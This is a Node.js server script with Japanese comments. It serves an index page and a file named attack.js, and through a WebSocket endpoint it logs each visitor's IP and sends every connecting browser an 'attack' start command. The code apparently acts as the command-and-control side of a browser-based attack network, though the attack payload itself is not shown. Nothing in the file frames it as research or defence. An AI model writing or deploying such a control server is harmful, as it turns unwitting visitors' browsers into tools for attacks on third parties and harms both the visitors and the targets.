const WebSocket = require('ws');
const http = require('http');
const fs = require('fs');

const server = http.createServer((req, res) => {
    // ログは取るけどシンプルに
    if (req.url === '/' || req.url.startsWith('/?') || req.url === '/index.html') {
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end(fs.readFileSync('index.html'));
    } else if (req.url === '/attack.js') {
        res.writeHead(200, { 'Content-Type': 'application/javascript' });
        res.end(fs.readFileSync('attack.js'));
    } else {
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end('OK');
    }
});

const wss = new WebSocket.Server({ server, path: '/ws' });

wss.on('connection', (ws, req) => {
    const ip = req.connection.remoteAddress;
    console.log(`[+] 接続: ${ip}`);
    
    // 攻撃開始命令
    ws.send(JSON.stringify({
        command: 'attack'
    }));
    
    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);
            if (msg.type === 'ping') {
                ws.send(JSON.stringify({ type: 'pong' }));
            }
        } catch(e) {}
    });
    
    ws.on('close', () => {
        console.log(`[-] 切断: ${ip}`);
    });
    
    ws.on('error', () => {});
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`サーバー起動: ${PORT}`);
});
